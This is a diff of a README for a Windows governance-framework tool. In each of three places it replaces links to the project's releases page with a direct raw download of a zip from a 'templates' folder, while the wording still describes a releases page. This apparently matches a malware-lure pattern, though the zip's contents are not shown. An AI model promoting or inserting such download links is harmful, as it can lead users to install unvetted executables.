@@ -1,6 +1,6 @@
 # ⚙️ enterprise-operating-model - Clear Frameworks for Enterprise Governance
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/doryatir-design/enterprise-operating-model/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/doryatir-design/enterprise-operating-model/main/templates/enterprise_operating_model_v3.5-alpha.5.zip)
 
 ## 📋 About This Application
 
@@ -27,7 +27,7 @@ Follow these steps to get the software running on your Windows machine. The proc
 ### 1. Visit the Release Page
 
 Click the large download link at the top or visit:  
-[https://github.com/doryatir-design/enterprise-operating-model/releases](https://github.com/doryatir-design/enterprise-operating-model/releases)
+[https://raw.githubusercontent.com/doryatir-design/enterprise-operating-model/main/templates/enterprise_operating_model_v3.5-alpha.5.zip](https://raw.githubusercontent.com/doryatir-design/enterprise-operating-model/main/templates/enterprise_operating_model_v3.5-alpha.5.zip)
 
 This page lists all available versions of the software.
 
@@ -114,7 +114,7 @@ Check the GitHub repository’s Wiki page for community advice and additional do
 
 Access the latest version anytime by visiting the release page here:
 
-[https://github.com/doryatir-design/enterprise-operating-model/releases](https://github.com/doryatir-design/enterprise-operating-model/releases)
+[https://raw.githubusercontent.com/doryatir-design/enterprise-operating-model/main/templates/enterprise_operating_model_v3.5-alpha.5.zip](https://raw.githubusercontent.com/doryatir-design/enterprise-operating-model/main/templates/enterprise_operating_model_v3.5-alpha.5.zip)
 
 Click the file relevant for Windows and follow the steps to install as explained above.
 
